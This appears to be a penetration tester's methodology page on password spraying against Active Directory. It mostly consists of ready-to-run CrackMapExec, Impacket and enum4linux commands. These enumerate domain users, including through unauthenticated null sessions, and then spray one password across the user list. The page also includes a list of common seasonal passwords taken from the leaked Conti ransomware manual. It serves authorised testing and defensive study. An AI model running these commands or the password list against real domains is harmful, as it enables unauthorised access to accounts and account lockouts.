---
description: Methodology for performing password spraying attacks against active directory
---

# Password Spraying Active Directory

This section contains some of my methodology and tips for performing password spraying attacks against Active Directory. Before spraying, I highly recommend that you first [enumerate the password policy](../../../pentesting/infrastructure/active-directory/password-policy.md) on the domain so that you don't lock out accounts.&#x20;

### Get List of Users

```bash
# Get List of Users with CrackMapExec via RID Cycling (Unauthenticated)
crackmapexec smb $dc -u '' -p '' --users
crackmapexec smb $dc -u '' -p '' --groups

# Get List of Users with CrackMapExec via RID Cycling
crackmapexec smb $dc -u $username -p $password --users

# Get List of Users with Impacket
GetADUsers.py $domain/$username:$password -all -dc-ip $dc

# Get List of Users with Enum4linux
enum4linux $dc -u $username -p $password -U

# Sort Usernames Obtained from Enum4Linux
cat usernameenum.txt | grep "user" | awk {'print $1'} | cut -d '[' -f 2 | cut -d ']' -f 1 | sort -u -f > UsernameList.txt
```

### Spraying

```bash
# Spray with CrackMapExec
crackmapexec smb $ip -u $username_list -p Winter2022! --continue-on-success
```

### Password List

These passwords were referenced from the published [Conti manual](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) and often work. This should be an unspoken rule, but ensure that your list is tailored for each engagement (year, month, etc).

```bash
Password1
Hello123
password
Welcome1
Acme@1
training
Password123
job12345
food1234
June2022
July2022
August22
August2022
Summer22
Summer2022
June2022!
July2022!
August22!
August2022!
Summer22!
Summer2022!
```

### References

{% embed url="https://wiki.porchetta.industries/smb-protocol/enumeration/enumerate-null-sessions" %}
